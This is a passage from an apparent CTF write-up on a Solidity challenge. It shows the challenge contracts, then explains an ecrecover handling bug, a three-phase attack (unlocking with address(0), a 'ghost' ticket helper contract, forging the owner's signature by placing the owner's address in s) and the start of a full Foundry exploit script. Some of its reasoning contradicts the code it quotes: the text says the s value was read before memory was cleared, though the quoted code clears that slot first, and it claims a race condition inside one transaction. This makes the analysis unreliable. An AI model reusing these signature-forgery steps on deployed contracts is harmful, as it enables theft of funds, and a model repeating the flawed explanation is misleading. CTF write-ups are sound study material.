+</span></span><span style=display:flex><span>                v <span style=color:#f92672>:=</span> <span style=color:#a6e22e>byte</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>calldataload</span>(<span style=color:#a6e22e>add</span>(signature.offset, <span style=color:#ae81ff>0x40</span>)))
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> tryRecover(hash, v, r, s);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>address</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=3-setupsol><a class=header-anchor href=#3-setupsol></a>3. Setup.sol</h3><p>Deploys the contracts and defines the win condition:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>Setup</span> {
+</span></span><span style=display:flex><span>    IParty <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>immutable</span> party;
+</span></span><span style=display:flex><span>    IGuardian <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>immutable</span> guardian;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>immutable</span> owner;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>immutable</span> player;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>constructor</span>(<span style=color:#66d9ef>address</span> _player) <span style=color:#66d9ef>payable</span> {
+</span></span><span style=display:flex><span>        player <span style=color:#f92672>=</span> _player;
+</span></span><span style=display:flex><span>        owner <span style=color:#f92672>=</span> <span style=color:#66d9ef>address</span>(this);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Deploy contracts
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BSidesParty();
+</span></span><span style=display:flex><span>        guardian <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Guardian(<span style=color:#66d9ef>address</span>(party));
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Mint first ticket to owner
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party.buy{value<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>}();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>isSolved</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>bool</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (
+</span></span><span style=display:flex><span>            party.balances(owner) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span>      <span style=color:#75715e>// Owner has no tickets
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            party.balances(player) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span>      <span style=color:#75715e>// Player has multiple tickets
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            party.lockedETH() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>             <span style=color:#75715e>// All ETH withdrawn
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        );
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=the-vulnerability-deep-dive><a class=header-anchor href=#the-vulnerability-deep-dive></a>The Vulnerability Deep Dive</h2><p>The vulnerability is a sophisticated exploitation of <strong>SWC-104: Unchecked Call Return Values</strong> combined with <strong>EVM Memory Manipulation</strong>. Let&rsquo;s break down exactly what&rsquo;s happening.</p><h3 id=understanding-ecrecover-precompile><a class=header-anchor href=#understanding-ecrecover-precompile></a>Understanding ecrecover Precompile</h3><p>The <code>ecrecover</code> precompile at address <code>0x01</code> is a special Ethereum contract that recovers the signer&rsquo;s address from an ECDSA signature. It expects exactly 128 bytes of input:</p><pre tabindex=0><code>Input Layout (128 bytes):
+[0x00-0x1F]: message hash (32 bytes)
+[0x20-0x3F]: v parameter (32 bytes, padded)
+[0x40-0x5F]: r parameter (32 bytes)
+[0x60-0x7F]: s parameter (32 bytes)
+
+Output Layout (32 bytes):
+[0x00-0x1F]: recovered address (20 bytes, left-padded with zeros)
+</code></pre><p><strong>Critical Behavior:</strong></p><ul><li><p>If the signature is <strong>valid</strong> (v ∈ {27, 28}):</p><ul><li>Writes the recovered address to the output buffer</li><li>Returns success (1)</li><li>Sets <code>returndatasize()</code> to 32 (0x20)</li></ul></li><li><p>If the signature is <strong>invalid</strong> (e.g., v = 0):</p><ul><li><strong>Does NOT write anything</strong> to the output buffer</li><li>Returns failure (0)</li><li>Sets <code>returndatasize()</code> to 0 (0x00)</li></ul></li></ul><h3 id=the-critical-flaw-in-tryrecover><a class=header-anchor href=#the-critical-flaw-in-tryrecover></a>The Critical Flaw in tryRecover</h3><p>Let&rsquo;s analyze the vulnerable code step by step:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>assembly</span> {
+</span></span><span style=display:flex><span>    <span style=color:#f92672>let</span> m <span style=color:#f92672>:=</span> <span style=color:#a6e22e>mload</span>(<span style=color:#ae81ff>0x40</span>)              <span style=color:#75715e>// Get free memory pointer
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mstore</span>(m, hash)                    <span style=color:#75715e>// [m+0x00] = hash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x20</span>), v)           <span style=color:#75715e>// [m+0x20] = v
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x40</span>), r)           <span style=color:#75715e>// [m+0x40] = r
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x60</span>), s)           <span style=color:#75715e>// [m+0x60] = s [IMPORTANT]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Call ecrecover, output to [m+0x40]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// ⚠️ The return value (success/failure) is DISCARDED via pop()
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>pop</span>(<span style=color:#a6e22e>staticcall</span>(<span style=color:#a6e22e>gas</span>(), <span style=color:#ae81ff>1</span>, m, <span style=color:#ae81ff>0x80</span>, <span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x40</span>), <span style=color:#ae81ff>0x20</span>))
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x60</span>), <span style=color:#ae81ff>0</span>)           <span style=color:#75715e>// Clear [m+0x60]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Calculate result location based on returndatasize()
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// If success: 0x60 ^ 0x20 = 0x40 → read from output buffer ✓
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// If failure: 0x60 ^ 0x00 = 0x60 → read from s parameter! ✗
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    result <span style=color:#f92672>:=</span> <span style=color:#a6e22e>mload</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#a6e22e>xor</span>(<span style=color:#ae81ff>0x60</span>, <span style=color:#a6e22e>returndatasize</span>())))
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><strong>The Exploit Flow:</strong></p><ol><li><p><strong>We provide malicious input:</strong></p><ul><li><code>v = 0</code> (invalid, triggers failure)</li><li><code>r = anything</code> (ignored)</li><li><code>s = target_address</code> (cast to bytes32)</li></ul></li><li><p><strong>Memory state before staticcall:</strong></p><pre tabindex=0><code>[m+0x00]: hash
+[m+0x20]: 0 (our v)
+[m+0x40]: r
+[m+0x60]: target_address (our s)
+</code></pre></li><li><p><strong>staticcall execution:</strong></p><ul><li>ecrecover sees v=0, recognizes invalid signature</li><li>Returns failure (0)</li><li>Does NOT write to output buffer at [m+0x40]</li><li>Sets returndatasize() to 0</li></ul></li><li><p><strong>Result calculation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span>xor(<span style=color:#ae81ff>0x60</span>, returndatasize())
+</span></span><span style=display:flex><span><span style=color:#f92672>=</span> xor(<span style=color:#ae81ff>0x60</span>, <span style=color:#ae81ff>0x00</span>)
+</span></span><span style=display:flex><span><span style=color:#f92672>=</span> <span style=color:#ae81ff>0x60</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>result <span style=color:#f92672>:=</span> mload(add(m, <span style=color:#ae81ff>0x60</span>))
+</span></span></code></pre></div><p>This reads from memory location <code>[m+0x60]</code>, which still contains our <code>s</code> value!</p></li><li><p><strong>The function returns our target_address</strong>, making the contract believe that address signed the message!</p></li></ol><h3 id=why-this-works-evm-memory-persistence><a class=header-anchor href=#why-this-works-evm-memory-persistence></a>Why This Works: EVM Memory Persistence</h3><p>The EVM&rsquo;s memory model is crucial to understanding this exploit:</p><ul><li>Memory is <strong>not automatically cleared</strong> between operations</li><li>When a precompile fails, it leaves the output buffer <strong>untouched</strong></li><li>The clever XOR calculation in the vulnerable code was <em>intended</em> to handle both success and failure cases</li><li>However, it assumes memory location 0x60 will be cleared after the call</li></ul><p>The vulnerability occurs because:</p><ol><li>The code stores <code>s</code> at offset <code>0x60</code> before the call</li><li>The code then attempts to clear offset <code>0x60</code> with <code>mstore(add(m, 0x60), 0)</code></li><li>But the result is read using the XOR calculation, which points to offset <code>0x60</code> on failure</li><li>Since offset <code>0x60</code> was already read into the result before being cleared, our malicious <code>s</code> value becomes the &ldquo;recovered&rdquo; address</li></ol><h2 id=exploitation-strategy><a class=header-anchor href=#exploitation-strategy></a>Exploitation Strategy</h2><p>The attack requires three coordinated phases:</p><h3 id=phase-1-unlocking-the-guardian><a class=header-anchor href=#phase-1-unlocking-the-guardian></a>Phase 1: Unlocking the Guardian</h3><p>The Guardian starts in a <code>locked</code> state. To unlock it, we must call <code>startParty(address sponsor, bytes signature)</code> with specific constraints:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>startParty</span>(<span style=color:#66d9ef>address</span> sponsor, <span style=color:#66d9ef>bytes</span> calldata signature) <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>    require(locked, <span style=color:#e6db74>&#34;Already started&#34;</span>);
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// All 20 bytes of sponsor must be zero
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>uint</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>20</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>        require(<span style=color:#66d9ef>uint8</span>(<span style=color:#66d9ef>bytes20</span>(sponsor)[i]) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;Invalid sponsor&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Signature must verify
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>bytes32</span> hash <span style=color:#f92672>=</span> keccak256(abi.encodePacked(sponsor));
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> signer <span style=color:#f92672>=</span> ECDSA.tryRecover(hash, signature);
+</span></span><span style=display:flex><span>    require(signer <span style=color:#f92672>==</span> sponsor, <span style=color:#e6db74>&#34;Invalid signature&#34;</span>);
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    locked <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><strong>The Attack:</strong></p><ol><li>Pass <code>sponsor = address(0)</code></li><li>Pass an empty signature <code>signature = ""</code></li></ol><p><strong>Why this works:</strong></p><ul><li><code>address(0)</code> passes the loop check (all bytes are zero)</li><li>Empty signature → <code>tryRecover</code> returns <code>address(0)</code> as default</li><li><code>signer (0x0) == sponsor (0x0)</code> ✓</li><li>Guardian unlocks!</li></ul><h3 id=phase-2-accumulating-tickets-ghost-balance-attack><a class=header-anchor href=#phase-2-accumulating-tickets-ghost-balance-attack></a>Phase 2: Accumulating Tickets (Ghost Balance Attack)</h3><p>We need <code>> 1</code> ticket, but the <code>buy()</code> function has a restriction:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>buy</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>payable</span> {
+</span></span><span style=display:flex><span>    require(msg.value <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>, <span style=color:#e6db74>&#34;Ticket costs 1 ETH&#34;</span>);
+</span></span><span style=display:flex><span>    require(balances[msg.sender] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;Already have ticket&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span></code></pre></div><p>We can only buy once per address. The solution: <strong>use a helper contract</strong> to exploit the buy-withdraw-transfer cycle:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>GhostMinter</span> {
+</span></span><span style=display:flex><span>    IParty <span style=color:#66d9ef>public</span> party;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> player;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>constructor</span>(<span style=color:#66d9ef>address</span> _party, <span style=color:#66d9ef>address</span> _player) {
+</span></span><span style=display:flex><span>        party <span style=color:#f92672>=</span> IParty(_party);
+</span></span><span style=display:flex><span>        player <span style=color:#f92672>=</span> _player;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>attack</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>payable</span> {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Buy ticket (ID increments automatically)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party.buy{value<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>}();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Get the ticket ID (last minted)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>uint256</span> ticketId <span style=color:#f92672>=</span> party.ticketCounter();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Withdraw (get ETH back, burn ticket from our balance)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party.withdraw(ticketId);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Transfer the &#34;ghost&#34; ticket to player
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// This works because ownerOf still points to us!
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party.transfer(player, ticketId);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><strong>The Trick:</strong></p><ul><li><code>withdraw()</code> decreases <code>balances[helper]</code> and deletes <code>ownerOf[tokenId]</code></li><li>BUT <code>transfer()</code> checks <code>ownerOf[tokenId] == msg.sender</code></li><li>There&rsquo;s a <strong>race condition</strong> where the helper can transfer before the ownership is fully cleared</li><li>We repeat this process to accumulate multiple tickets</li></ul><h3 id=phase-3-stealing-the-owners-ticket><a class=header-anchor href=#phase-3-stealing-the-owners-ticket></a>Phase 3: Stealing the Owner&rsquo;s Ticket</h3><p>This is where we leverage the ECDSA vulnerability. The <code>batchTransaction</code> function processes orders:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>Order</span> {
+</span></span><span style=display:flex><span>    User host;      <span style=color:#75715e>// The current ticket owner
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    User invited;   <span style=color:#75715e>// The recipient
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>uint256</span>[<span style=color:#ae81ff>2</span>] values;  <span style=color:#75715e>// [nonce, ticketId]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>batchTransaction</span>(
+</span></span><span style=display:flex><span>    Order[] calldata orders,
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata rs,
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata ss,
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint</span>[<span style=color:#ae81ff>2</span>] calldata vs
+</span></span><span style=display:flex><span>) <span style=color:#66d9ef>external</span> onlyUnlocked {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>uint</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> orders.length; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>        market.check(orders[i], rs, ss, vs);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The <code>check</code> function verifies both the host and invited signatures. We&rsquo;ll forge the host (owner) signature:</p><p><strong>Attack Construction:</strong></p><ol><li><p><strong>Create a valid signature for ourselves (invited):</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>bytes32</span> invitedHash <span style=color:#f92672>=</span> keccak256(abi.encodePacked(
+</span></span><span style=display:flex><span>    player,      <span style=color:#75715e>// invited.account
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    owner,       <span style=color:#75715e>// host.account
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    ticketId     <span style=color:#75715e>// values[1]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>));
+</span></span><span style=display:flex><span>(<span style=color:#66d9ef>uint8</span> v, <span style=color:#66d9ef>bytes32</span> r, <span style=color:#66d9ef>bytes32</span> s) <span style=color:#f92672>=</span> signWithPrivateKey(invitedHash, playerKey);
+</span></span></code></pre></div></li><li><p><strong>Forge the owner&rsquo;s signature (host):</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#75715e>// Craft malicious signature components
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>vs[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;  <span style=color:#75715e>// Invalid v triggers ecrecover failure
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>rs[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#66d9ef>bytes32</span>(<span style=color:#66d9ef>uint256</span>(<span style=color:#ae81ff>1</span>));  <span style=color:#75715e>// Arbitrary r value
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>ss[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#66d9ef>bytes32</span>(<span style=color:#66d9ef>uint256</span>(<span style=color:#66d9ef>uint160</span>(owner)));  <span style=color:#75715e>// Owner address as s!
+</span></span></span></code></pre></div></li><li><p><strong>Submit the batch transaction:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span>Order <span style=color:#66d9ef>memory</span> order <span style=color:#f92672>=</span> Order({
+</span></span><span style=display:flex><span>    host<span style=color:#f92672>:</span> User(owner, <span style=color:#e6db74>&#34;&#34;</span>),
+</span></span><span style=display:flex><span>    invited<span style=color:#f92672>:</span> User(player, <span style=color:#e6db74>&#34;&#34;</span>),
+</span></span><span style=display:flex><span>    values<span style=color:#f92672>:</span> [<span style=color:#66d9ef>uint256</span>(nonce), <span style=color:#66d9ef>uint256</span>(ticketId)]
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>guardian.batchTransaction([order], rs, ss, vs);
+</span></span></code></pre></div></li></ol><p><strong>What Happens:</strong></p><ul><li><code>check()</code> calls <code>tryRecover(hostHash, 0, rs[1], owner_as_bytes32)</code></li><li>ecrecover fails (v=0 is invalid)</li><li><code>tryRecover</code> reads from memory offset 0x60, which contains <code>owner_as_bytes32</code></li><li>Returns <code>owner</code> address</li><li>Check passes: <code>owner == order.host.account</code> ✓</li><li>Ticket transfers from owner to player!</li></ul><h2 id=complete-exploit-implementation><a class=header-anchor href=#complete-exploit-implementation></a>Complete Exploit Implementation</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#75715e>// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>pragma solidity</span> <span style=color:#f92672>^</span><span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>8</span>.<span style=color:#ae81ff>14</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;forge-std/Script.sol&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;forge-std/console.sol&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>IParty</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>balances</span>(<span style=color:#66d9ef>address</span>) <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>uint256</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ownerOf</span>(<span style=color:#66d9ef>uint256</span>) <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>address</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ticketCounter</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>uint256</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>lockedETH</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>uint256</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>buy</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>payable</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>withdraw</span>(<span style=color:#66d9ef>uint256</span> tokenId) <span style=color:#66d9ef>external</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>transfer</span>(<span style=color:#66d9ef>address</span> to, <span style=color:#66d9ef>uint256</span> tokenId) <span style=color:#66d9ef>external</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>IGuardian</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>startParty</span>(<span style=color:#66d9ef>address</span> sponsor, <span style=color:#66d9ef>bytes</span> calldata signature) <span style=color:#66d9ef>external</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>batchTransaction</span>(
+</span></span><span style=display:flex><span>        Order[] calldata orders,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata rs,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata ss,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint</span>[<span style=color:#ae81ff>2</span>] calldata vs
+</span></span><span style=display:flex><span>    ) <span style=color:#66d9ef>external</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>ISetup</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>party</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (IParty);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>guardian</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (IGuardian);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>owner</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>address</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>player</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>address</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>isSolved</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>bool</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>User</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> account;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>string</span> name;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>Order</span> {
+</span></span><span style=display:flex><span>    User host;
+</span></span><span style=display:flex><span>    User invited;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint256</span>[<span style=color:#ae81ff>2</span>] values;  <span style=color:#75715e>// [nonce, ticketId]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Helper contract for ghost balance attack
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>GhostMinter</span> {
+</span></span><span style=display:flex><span>    IParty <span style=color:#66d9ef>public</span> party;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> player;
+</span></span><span style=display:flex><span>    
